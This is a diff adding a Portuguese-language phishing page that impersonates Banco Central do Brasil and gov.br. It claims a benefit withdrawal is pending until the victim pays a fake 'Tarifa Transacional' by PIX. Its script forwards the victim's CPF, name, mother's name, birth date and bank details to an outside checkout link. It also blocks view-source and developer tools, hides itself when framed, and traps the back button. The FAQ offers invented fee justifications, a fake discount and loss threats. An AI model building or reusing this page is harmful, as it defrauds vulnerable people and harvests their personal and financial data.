@@ -1,0 +1,395 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Tarifa Transacional</title>
+  <!-- Open Graph -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Consulta de Benefícios — Banco Central do Brasil">
+  <meta property="og:description" content="Verifique seus benefícios disponíveis para saque.">
+  <meta property="og:image" content="https://brasilconsulta.org/wp-content/uploads/2026/02/og-image.jpg">
+  <meta property="og:locale" content="pt_BR">
+  <meta name="twitter:card" content="summary">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;800;900&family=Source+Sans+3:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script id="_wauwn5jof" async="" src="js/p2.js"></script>
+<noscript><img src="//whos.amung.us/p2/widget/wn5jof.png" border="0"/></noscript>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:Raleway,sans-serif}
+html,body{background:#fff;max-width:480px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}
+
+/* TOPO */
+.topo{background:#fff;text-align:center}
+.topo-card{background:#fff;border:1px solid #ddd;border-top:none;border-radius:0 0 22px 22px;padding:18px 52px 20px;display:inline-block;text-align:center}
+
+/* CONTEÚDO */
+.content{padding:20px 16px 30px;background:#fff;flex:1}
+
+/* ALERTA */
+.alerta-icon{text-align:center;margin:8px 0 12px}
+.alerta-icon svg{width:54px;height:54px}
+.titulo{color:#1a1f8c;font-size:23px;font-weight:900;text-align:center;line-height:1.4;margin:4px 4px 12px;letter-spacing:-0.3px}
+.subtitulo{color:#666;font-size:15px;font-weight:500;text-align:center;line-height:1.6;margin-bottom:24px}
+
+/* VÍDEO - igual página 08 */
+.video-wrap{position:relative;width:100%;border-radius:12px;overflow:hidden;background:#111;margin-bottom:6px;cursor:pointer}
+.video-wrap video{width:100%;display:block;object-fit:cover}
+#overlaysom{position:absolute;inset:0;background:rgba(0,0,0,0.45);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:10;cursor:pointer}
+.som-icon{background:rgba(255,255,255,0.15);border-radius:50%;width:70px;height:70px;display:flex;align-items:center;justify-content:center}
+.som-txt{color:#fff;font-size:20px;font-weight:800;text-align:center;line-height:1.2}
+.som-sub{color:rgba(255,255,255,0.8);font-size:13px;text-align:center}
+#overlayPause{position:absolute;inset:0;background:rgba(0,0,0,0.4);display:none;align-items:center;justify-content:center;z-index:9}
+.pause-circle{background:rgba(255,255,255,0.2);border:3px solid #fff;border-radius:50%;width:64px;height:64px;display:flex;align-items:center;justify-content:center}
+.legenda{text-align:center;font-size:11px;color:#999;letter-spacing:1px;text-transform:uppercase;margin-bottom:28px;margin-top:6px}
+
+/* TEXTOS */
+.txt-verde{color:#22a861;font-size:14px;font-weight:800;text-align:center;line-height:1.5;text-transform:uppercase;margin-bottom:20px;margin-top:4px}
+.txt-verde span{color:#1a1f8c}
+.dados-titulo{color:#1a1f8c;font-size:16px;font-weight:900;text-align:center;text-transform:uppercase;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #eee}
+.dado-linha{font-size:15px;color:#444;text-align:center;margin-bottom:11px;line-height:1.5}
+.dado-linha b{color:#111;font-weight:700}
+.divisor{border:none;border-top:1px solid #eee;margin:22px 0}
+
+/* PREÇO */
+.preco-aviso{font-size:13px;color:#555;font-weight:600;text-align:center;text-transform:uppercase;margin-bottom:8px;margin-top:24px;line-height:1.6;word-break:break-word;overflow-wrap:break-word}
+.preco-riscado{font-size:14px;color:#aaa;text-decoration:line-through;text-align:center;margin-bottom:8px}
+.preco-valor{color:#1a1f8c;font-size:38px;font-weight:900;font-family:'Source Sans 3',sans-serif;letter-spacing:-1px;text-align:center;margin-bottom:26px}
+
+/* CTA */
+.cta-txt{font-size:13px;color:#444;text-align:center;line-height:1.7;margin-bottom:20px;font-weight:600}
+.cta-txt b{color:#1a1f8c;font-weight:900}
+
+/* BOTÃO */
+.btn-pagar{width:100%;background:#1a1f8c;color:#fff;border:none;border-radius:50px;padding:20px;font-size:17px;font-weight:800;cursor:pointer;font-family:Raleway,sans-serif;letter-spacing:1px;text-transform:uppercase;box-shadow:0 4px 16px rgba(26,31,140,0.3);display:block;text-decoration:none;text-align:center;margin-bottom:14px}
+
+.pix-via-badge{display:inline-flex;align-items:center;background:#f0fffe;border:1.5px solid #32BCAD;border-radius:6px;padding:3px 10px;gap:5px;font-size:13px;font-weight:800;color:#32BCAD;letter-spacing:0.5px}
+.pix-logo{font-size:11px;color:#32BCAD}
+.atencao-txt{font-size:11px;color:#666;text-align:center;text-transform:uppercase;line-height:1.7;margin-bottom:36px;margin-top:4px}
+.atencao-txt b{color:#1a1f8c}
+
+/* FAQ */
+.faq-titulo{color:#1a1f8c;font-size:16px;font-weight:900;text-align:center;margin-top:39px;margin-bottom:14px;text-transform:uppercase;letter-spacing:0.5px}
+.faq-item{border:1px solid #e0e0e0;border-bottom:none}
+.faq-item:last-child{border-bottom:1px solid #e0e0e0;margin-bottom:36px}
+.faq-pergunta{padding:15px 16px;cursor:pointer;display:flex;align-items:center;gap:10px;background:#f9f9f9;transition:background 0.15s}
+.faq-pergunta:hover{background:#f0f0ff}
+.faq-icon{color:#1a1f8c;font-size:16px;font-weight:900;flex-shrink:0;transition:transform 0.2s;line-height:1}
+.faq-pergunta.open .faq-icon{transform:rotate(90deg)}
+.faq-q{color:#1a1f8c;font-size:14px;font-weight:700;flex:1;line-height:1.4}
+.faq-resposta{padding:14px 16px 14px 40px;font-size:14px;color:#444;line-height:1.7;display:none;border-top:1px solid #e0e0e0}
+.faq-resposta.open{display:block}
+
+/* FOOTER */
+.footer{background:#fff;border-top:1px solid #e8e8e8;padding:16px;text-align:center}
+.footer img{height:32px;width:auto}
+
+/* BARRA DE PROGRESSO VÍDEO */
+.prog-wrap{padding:8px 0 4px;background:transparent}
+.prog-bg{background:#e0e0e0;border-radius:99px;height:5px;overflow:hidden}
+.prog-bar{background:#1a1f8c;height:5px;border-radius:99px;width:0%;transition:width 0.3s linear}
+</style>
+
+
+
+<script>
+  window.pixelId = "664ee353f1b7ad75c57d286e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script async="" defer="" src="js/pixel.js"></script></head>
+<body>
+
+<!-- TOPO -->
+<div class="topo">
+  <div class="topo-card">
+    <svg xmlns="http://www.w3.org/2000/svg" width="90" height="51" viewBox="0 0 65 36.174"><path d="M39.577,27.84h1.356l-.049-3.748h.025l1.923,3.748h1.8v-5.5H43.3l.025,3.723H43.3l-1.849-3.723H39.577v5.5Zm7.077,0h1.455V23.426h1.356V22.341H45.3v1.085h1.356Zm3.477,0h1.455V25.67h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208V25.1a1.294,1.294,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H50.106l.025,5.5Zm1.455-4.463h.395c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641h-.395V23.376ZM4.611,27.84h1.48l.444-1.184H8.606l.419,1.184H10.6l-2.121-5.5h-1.8C6.707,22.341,4.611,27.84,4.611,27.84ZM8.261,25.62H6.88l.715-2.145H7.62l.641,2.145ZM0,27.84H2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406H0v5.5ZM1.455,25.5H1.9c.493,0,1.085.049,1.085.666,0,.567-.567.641-1.085.641H1.455Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592H1.455Zm9.494,4.463H12.3l-.049-3.748h.025L14.2,27.84h1.825v-5.5H14.7l.025,3.723H14.7l-1.874-3.723H10.948v5.5Zm10.431-1.282a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.11,6.11,0,0,0-1.627-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.074-1.159Zm.222-1.48a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836,2.54,2.54,0,0,0-2.762-2.836A2.54,2.54,0,0,0,21.6,25.078Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S23.105,25.99,23.105,25.078Zm11.022,1.48a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.289,6.289,0,0,0-1.652-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.049-1.159Zm.74,1.282h3.97V26.8H36.347V25.571h2.269V24.535H36.347V23.4h2.417V22.365H34.892l-.025,5.474Zm20.072,0h1.48l.444-1.184h2.071l.419,1.184h1.6l-2.121-5.5h-1.8l-2.1,5.5Zm3.625-2.219H57.183l.715-2.145h.025Zm2.712,2.219H65V26.755H62.731V22.341H61.277v5.5ZM28.9,19.579h5.5l1.726-1.726h-5.5V14.77h1.036l1.726-1.726H29.245V8.926l-1.726,1.726v1.036H24.437v-5.5L22.711,7.915v5.5h3.107V16.5h3.107v3.082ZM35.089,7.225V3.107l1.726-1.726V5.524h4.118L39.207,7.25ZM30.626,1.381H29.245V5.5h4.118L31.637,7.225H27.519V6.189H25.793V4.808L30.626,0ZM40.933,13.069V11.688h1.381L37.481,16.5H36.1V14.77H35.064V10.653l1.726-1.726v4.143ZM12.181,36.076h2c1.874,0,3.255-.715,3.255-2.762,0-2.121-1.332-2.737-3.255-2.737h-2v5.5Zm1.455-4.414H14.2a1.653,1.653,0,1,1,0,3.3h-.567Zm4.118,1.677a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836A2.54,2.54,0,0,0,20.516,30.5,2.529,2.529,0,0,0,17.754,33.338Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S19.258,34.226,19.258,33.338Zm6.535,2.737h2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406h-2.54v5.5Zm1.48-2.343h.444c.493,0,1.085.049,1.085.641,0,.567-.567.641-1.085.641h-.444V33.733Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592h-.419l.025-1.134Zm3.649,4.463h1.455v-2.17h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208v-.025a1.278,1.278,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H30.9l.025,5.5Zm1.48-4.463H32.8c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641H32.4V31.612Zm3.329,4.463h1.48l.444-1.184H39.7l.419,1.184h1.6l-2.121-5.5H37.8l-2.071,5.5Zm3.649-2.219H38l.715-2.145h.025l.641,2.145Zm7.274,2.219h1.455v-5.5H46.654v5.5Zm2.466,0h3.723V34.991H50.575V30.577H49.12v5.5Zm-7.176-.148a5.323,5.323,0,0,0,1.627.247c1.233,0,2.417-.395,2.417-1.825,0-1.973-2.589-1.381-2.589-2.269,0-.469.616-.518.986-.518a3.06,3.06,0,0,1,1.233.247l.1-1.134a4.017,4.017,0,0,0-1.43-.2c-1.11,0-2.392.37-2.392,1.677,0,2,2.589,1.356,2.589,2.367,0,.444-.444.542-.912.542a3.231,3.231,0,0,1-1.5-.37Z" fill="#025c75" fill-rule="evenodd"></path></svg>
+  </div>
+</div>
+
+<div class="content">
+
+  <!-- ALERTA -->
+  <div class="alerta-icon">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M12 2L2 20h20L12 2z" fill="#F59E0B"></path><path d="M12 9v5" stroke="#fff" stroke-width="2.2" stroke-linecap="round"></path><circle cx="12" cy="16.8" r="1" fill="#fff"></circle></svg>
+  </div>
+  <div class="titulo" id="frase">Seu saque de <span style="font-family:'Source Sans 3',sans-serif;font-weight:900">R$ 5.874,13</span> está pendente, aguardando o pagamento da Tarifa Transacional.</div>
+  <div class="subtitulo">Assista ao vídeo abaixo para entender como funciona e realizar o pagamento.</div>
+
+  <!-- VÍDEO -->
+  <div class="video-wrap" id="videoWrap">
+    <video id="vid" src="media/vsl-tarifa.mp4" playsinline="" webkit-playsinline="" muted="" autoplay="" preload="auto"></video>
+    <div id="overlaysom">
+      <div class="som-icon">
+        <svg viewBox="0 0 24 24" width="34" height="34" fill="white"><path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"></path></svg>
+      </div>
+      <div class="som-txt">Clique para ouvir</div>
+      <div class="som-sub">Ative o som para assistir ao vídeo.</div>
+    </div>
+    <div id="overlayPause" style="display: none;">
+      <div class="pause-circle">
+        <svg viewBox="0 0 24 24" width="30" height="30" fill="white"><path d="M8 5v14l11-7z"></path></svg>
+      </div>
+    </div>
+  </div>
+  <div class="legenda">Veja como é fácil pagar</div>
+
+  <!-- NECESSÁRIO -->
+  <div class="txt-verde">
+    Para liberar o seu saque, é necessário realizar o pagamento da <span>Tarifa Transacional Única.</span>
+  </div>
+
+  <!-- DADOS BANCÁRIOS -->
+  <div>
+    <div class="dados-titulo">Dados bancários do beneficiário:</div>
+    <div id="informacoes-adicionais"></div>
+  </div>
+
+  <div class="divisor"></div>
+
+  <!-- PREÇO -->
+  <div class="preco-aviso">Realize o pagamento ainda hoje e aproveite o desconto exclusivo:</div>
+  <div class="preco-riscado">De R$ 85,79 por apenas:</div>
+  <div class="preco-valor">R$ 68,79</div>
+
+  <!-- CTA + BOTÃO -->
+  <div class="cta-txt">Clique no botão abaixo para realizar o pagamento da <b>Tarifa Transacional</b> e liberar imediatamente o seu saque.</div>
+  <a href="https://taxapay.lat/VAFR9DO9Q43MV3" class="btn-pagar" id="btnPagar">Pagar Tarifa</a>
+  <div class="atencao-txt"><b>⚠ Atenção:</b> somente após a confirmação do pagamento desta taxa, o seu saque <b>será concluído.</b></div>
+
+  <!-- FAQ -->
+  <hr style="border:none;border-top:1px solid #eee;margin:0 0 0 0">
+  <div class="faq-titulo">Dúvidas Frequentes.</div>
+
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">Por que é cobrada a taxa de R$ 68,79?</span>
+    </div>
+    <div class="faq-resposta">Trata-se de uma tarifa transacional de caráter federal, aplicada à solicitação de saque dos valores disponíveis para resgate. O valor padrão é de <strong>R$ 85,79</strong>, porém estamos aplicando um desconto exclusivo de R$ 17,00, resultando no valor promocional de <strong>R$ 68,79</strong>.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">Por que a taxa não é descontada do saldo disponível para saque?</span>
+    </div>
+    <div class="faq-resposta">O saldo disponível para saque corresponde ao <strong>valor bruto integral</strong> ao qual o cidadão tem direito. Por norma do sistema financeiro e fiscal, esse montante não pode sofrer deduções antes de ser liberado ao titular.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">Quais são as formas de pagamento?</span>
+    </div>
+    <div class="faq-resposta">O pagamento é realizado exclusivamente via <strong>PIX</strong>. Após a confirmação, o valor solicitado é liberado em até <strong>2 horas</strong> diretamente na sua conta.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">Como posso realizar o saque rapidamente, sem esperar as 2 horas?</span>
+    </div>
+    <div class="faq-resposta">Após a confirmação do pagamento, o saque entra automaticamente em processamento no sistema financeiro. Esse procedimento segue protocolos de validação e segurança exigidos para garantir a integridade da operação.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">É seguro fazer o pagamento?</span>
+    </div>
+    <div class="faq-resposta">Sim. O pagamento é <strong>100% seguro</strong> e processado por instituições financeiras devidamente autorizadas e regulamentadas pelo <strong>Banco Central do Brasil</strong>. Todo o processo é criptografado e protegido.</div>
+  </div>
+  <div class="faq-item">
+    <div class="faq-pergunta" onclick="toggleFaq(this)">
+      <span class="faq-icon">›</span>
+      <span class="faq-q">Se eu não fizer o resgate, o que acontece?</span>
+    </div>
+    <div class="faq-resposta">Caso o resgate não seja realizado dentro do prazo estabelecido, os valores disponíveis poderão retornar aos <strong>cofres públicos</strong>, ficando novamente sob administração do poder público, sem possibilidade de recuperação.</div>
+  </div>
+  <div style="border-bottom:1px solid #e0e0e0;margin:0"></div>
+
+  <!-- BOTÃO FINAL -->
+  <a href="https://taxapay.lat/VAFR9DO9Q43MV3" class="btn-pagar" id="btnPagar2" style="margin-top:40px;margin-bottom:30px">Pagar Tarifa</a>
+
+</div>
+
+<div class="footer">
+  <img src="images/govbr.png" alt="gov.br">
+</div>
+
+<script>
+var params    = new URLSearchParams(window.location.search);
+var cpf       = params.get('cpf')           || '';
+var nome      = params.get('nome')          || '';
+var valor     = params.get('valor')         || '';
+var tipoOp    = params.get('tipo-operacao') || '';
+var pixKey    = params.get('PIX')           || '';
+var tipoChave = params.get('tipo-chave')    || 'CPF';
+var nomeBanco = params.get('nome-banco')    || '';
+var agencia   = params.get('agencia')       || '';
+var conta     = params.get('numero-conta')  || '';
+
+function fmtMoeda(v) {
+  if(!v) return '';
+  // Remove tudo exceto dígitos, ponto e vírgula
+  var s = String(v).trim();
+  // Formato "1.234,56" → converte para float
+  if(/[,]/.test(s) && /[.]/.test(s)) {
+    // tem ambos: assume formato pt-BR "1.234,56"
+    s = s.replace(/\./g,'').replace(',','.');
+  } else {
+    s = s.replace(',','.');
+  }
+  var n = parseFloat(s);
+  if(isNaN(n)) return v;
+  return n.toLocaleString('pt-BR', {style:'currency', currency:'BRL'});
+}
+
+// Título dinâmico
+if(valor) document.getElementById('frase').innerHTML = 'Seu saque de <span style="font-family:\'Source Sans 3\',sans-serif;font-weight:900">' + fmtMoeda(valor) + '</span> está pendente, aguardando o pagamento da Tarifa Transacional.';
+
+// Dados bancários
+var infoEl = document.getElementById('informacoes-adicionais');
+var html = '';
+
+// Ícone PIX (SVG inline limpo)
+var pixIcon = '<svg width="15" height="15" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" style="vertical-align:middle;margin-right:4px"><path d="M112.3 391.4c20.1 0 39-7.8 53.2-22l95.3-95.3c6.5-6.5 17-6.5 23.5 0l95.6 95.6c14.2 14.2 33.1 22 53.2 22h18.7L339.2 503.7c-46 46-120.5 46-166.5 0L60 391.4h52.3z" fill="#32BCAD"/><path d="M112.3 120.6c20.1 0 39 7.8 53.2 22l95.3 95.3c6.5 6.5 17 6.5 23.5 0l95.6-95.6c14.2-14.2 33.1-22 53.2-22h18.7L339.2 8.3c-46-46-120.5-46-166.5 0L60 120.6h52.3z" fill="#32BCAD"/><path d="M503.7 339.2l-73.6 73.6h-53.2c-13.5 0-26.5-5.4-36.1-14.9l-95.6-95.6c-8.8-8.8-20.5-13.2-32.2-13.2-11.7 0-23.4 4.4-32.2 13.2l-95.3 95.3c-9.5 9.5-22.5 14.9-36.1 14.9H8.3l73.6-73.6c-16.6-16.6-16.6-43.6 0-60.2l73.6-73.6V172.8L81.9 99.2c-16.6-16.6-16.6-43.6 0-60.2h53.2c13.5 0 26.5 5.4 36.1 14.9l95.3 95.3c17.7 17.7 46.4 17.7 64.1 0l95.6-95.6c9.5-9.5 22.5-14.9 36.1-14.9h53.2l73.6 73.6c16.6 16.6 16.6 43.6 0 60.2l-73.6 73.6v92.8l73.6 73.6c16.7 16.6 16.7 43.6.1 60.2z" fill="#32BCAD"/></svg>';
+
+// Badge TED padronizado
+var tedBadge = '<span style="display:inline-flex;align-items:center;background:#f0f4ff;border:1.5px solid #1a1f8c;border-radius:6px;padding:3px 10px;font-size:13px;font-weight:800;color:#1a1f8c;letter-spacing:0.5px">🏦 TED</span>';
+
+if(tipoOp === 'Conta Bancária') {
+  if(nome)      html += '<div class="dado-linha">Nome: <b>' + nome + '</b></div>';
+  html +=               '<div class="dado-linha">Pagamento via: <span style="display:inline-flex;align-items:center;background:#f0f4ff;border:1.5px solid #1a1f8c;border-radius:6px;padding:3px 10px;font-size:13px;font-weight:800;color:#1a1f8c;letter-spacing:0.5px">TED</span></div>';
+  if(nomeBanco) html += '<div class="dado-linha">Banco: <b>' + nomeBanco + '</b></div>';
+  if(agencia)   html += '<div class="dado-linha">Agência: <b>' + agencia + '</b></div>';
+  if(conta)     html += '<div class="dado-linha">Conta: <b>' + conta + '</b></div>';
+  html +=               '<div class="dado-linha" style="margin-top:8px">Total a pagar: <b style="color:#22a861;font-size:15px">R$ 68,79</b></div>';
+} else {
+  if(nome)      html += '<div class="dado-linha">Nome: <b>' + nome + '</b></div>';
+  html +=               '<div class="dado-linha">Pagamento via: <span class="pix-via-badge">PIX</span></div>';
+  if(tipoChave) html += '<div class="dado-linha">Tipo da Chave: <b>' + tipoChave + '</b></div>';
+  if(pixKey)    html += '<div class="dado-linha">Chave PIX: <b style="color:#1a1f8c;font-size:15px">' + pixKey + '</b></div>';
+  html +=               '<div class="dado-linha" style="margin-top:8px">Total a pagar: <b style="color:#22a861;font-size:15px">R$ 68,79</b></div>';
+}
+if(html) infoEl.innerHTML = html;
+
+// Botões
+// =============================================
+  // 🔗 LINK DO CHECKOUT — TROQUE AQUI
+  // =============================================
+  var LINK_PAGAR = 'https://taxapay.lat/VAFR9DO9Q43MV3';
+function buildUrl(base){
+  var p = new URLSearchParams();
+  // Dados pessoais
+  if(cpf)       p.set('cpf',           cpf);
+  if(nome)      p.set('nome',          nome);
+  if(valor)     p.set('valor',         valor);
+  if(valor)     p.set('total',         valor); // checkout usa 'total' também
+  // Dados nascimento/mae vindos da URL atual
+  var nasc = params.get('nasc') || '';
+  var mae  = params.get('mae')  || '';
+  if(nasc)      p.set('nascimento',    nasc);
+  // Dados bancários
+  if(tipoOp)    p.set('tipo-operacao', tipoOp);
+  if(tipoChave) p.set('tipo-chave',    tipoChave);
+  if(pixKey)    p.set('PIX',           pixKey);
+  if(nomeBanco) p.set('nome-banco',    nomeBanco);
+  if(agencia)   p.set('agencia',       agencia);
+  if(conta)     p.set('numero-conta',  conta);
+  // UTMs — repassa os que vieram na URL atual
+  ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k){
+    var v = params.get(k);
+    if(v) p.set(k, v);
+  });
+  return base + '?' + p.toString();
+}
+document.getElementById('btnPagar').href  = buildUrl(LINK_PAGAR);
+document.getElementById('btnPagar2').href = buildUrl(LINK_PAGAR);
+
+// VÍDEO - igual página 08
+var vid = document.getElementById('vid');
+var overlaysom = document.getElementById('overlaysom');
+var overlayPause = document.getElementById('overlayPause');
+var somAtivado = false;
+
+// Autoplay mudo ao carregar
+vid.muted = true;
+vid.play().catch(function(){});
+
+overlaysom.addEventListener('click', function(e){
+  e.stopPropagation();
+  vid.muted = false;
+  vid.volume = 1;
+  somAtivado = true;
+  overlaysom.style.display = 'none';
+  vid.currentTime = 0;
+  vid.play().catch(function(){});
+});
+
+document.getElementById('videoWrap').addEventListener('click', function(){
+  if(!somAtivado) return;
+  if(vid.paused) vid.play().catch(function(){});
+  else vid.pause();
+});
+
+overlayPause.addEventListener('click', function(e){
+  e.stopPropagation();
+  overlayPause.style.display = 'none';
+  vid.play().catch(function(){});
+});
+
+vid.addEventListener('pause', function(){ if(somAtivado) overlayPause.style.display = 'flex'; });
+vid.addEventListener('play',  function(){ overlayPause.style.display = 'none'; });
+
+var progBar10 = document.getElementById('progBar');
+var barOffset = 0;
+vid.addEventListener('timeupdate', function() {
+  if(!vid.duration || !progBar10) return;
+  var totalTime = vid.duration + 3;
+  var pct = barOffset + (vid.currentTime / totalTime) * (100 - barOffset);
+  progBar10.style.width = Math.min(pct, 100) + '%';
+});
+
+// FAQ
+function toggleFaq(el){
+  var resp = el.nextElementSibling;
+  var isOpen = resp.classList.contains('open');
+  document.querySelectorAll('.faq-resposta').forEach(function(r){ r.classList.remove('open'); });
+  document.querySelectorAll('.faq-pergunta').forEach(function(p){ p.classList.remove('open'); });
+  if(!isOpen){ resp.classList.add('open'); el.classList.add('open'); }
+}
+
+history.pushState(null,null,location.href);
+window.onpopstate = function(){ history.go(1); };
+</script>
+
+<!-- PIX icon template -->
+<div id="pixIconTpl" style="display:none"><svg width="16" height="16" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M112.3 391.4c20.1 0 39-7.8 53.2-22l95.3-95.3c6.5-6.5 17-6.5 23.5 0l95.6 95.6c14.2 14.2 33.1 22 53.2 22h18.7L339.2 503.7c-46 46-120.5 46-166.5 0L60 391.4h52.3z" fill="#32BCAD"></path><path d="M112.3 120.6c20.1 0 39 7.8 53.2 22l95.3 95.3c6.5 6.5 17 6.5 23.5 0l95.6-95.6c14.2-14.2 33.1-22 53.2-22h18.7L339.2 8.3c-46-46-120.5-46-166.5 0L60 120.6h52.3z" fill="#32BCAD"></path><path d="M503.7 172.8l-73.6-73.6h-53.2c-13.5 0-26.5 5.4-36.1 14.9l-95.6 95.6c-17.6 17.6-46.2 17.6-63.8 0l-95.3-95.3C76.5 105 63.5 99.2 50 99.2H8.3L8.3 172.8C-8.3 189.4-8.3 210.6 8.3 227.2l73.6 73.6V344c0 13.5 5.4 26.5 14.9 36.1l95.6 95.6c17.6 17.6 46.2 17.6 63.8 0l95.3-95.3c6.5-6.5 17-6.5 23.5 0l95.6 95.6c9.5 9.5 22.5 14.9 36.1 14.9h53.2l73.6-73.6c16.6-16.6 16.6-43.6 0-60.2L503.7 172.8z" fill="#32BCAD"></path></svg></div>
+<script>
+// ── Segurança ──────────────────────────────────────────────────────────────────
+document.addEventListener('contextmenu',function(e){e.preventDefault();});
+document.addEventListener('selectstart',function(e){e.preventDefault();});
+document.addEventListener('dragstart',function(e){e.preventDefault();});
+document.addEventListener('keydown',function(e){
+  if(e.ctrlKey&&['u','U','s','S','i','I','j','J'].indexOf(e.key)>-1){e.preventDefault();return false;}
+  if(e.key==='F12'){e.preventDefault();return false;}
+});
+(function(){try{if(window.self!==window.top&&window.top.location.hostname!==window.self.location.hostname){document.body.style.display='none';}}catch(e){document.body.style.display='none';}})();
+(function(){var t=160;var timer;window.addEventListener('resize',function(){clearTimeout(timer);timer=setTimeout(function(){if(window.outerWidth-window.innerWidth>t&&window.outerHeight-window.innerHeight>t){document.body.innerHTML='';}},300);});})();
+</script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" data-cf-beacon="{" version":"2024.11.0","token":"0da69eb37c66415ea049c7cf62f1578e","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+<script>
+  window.pixelId = "69bfe7f94cae1bf53bf14daa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+</body></html>
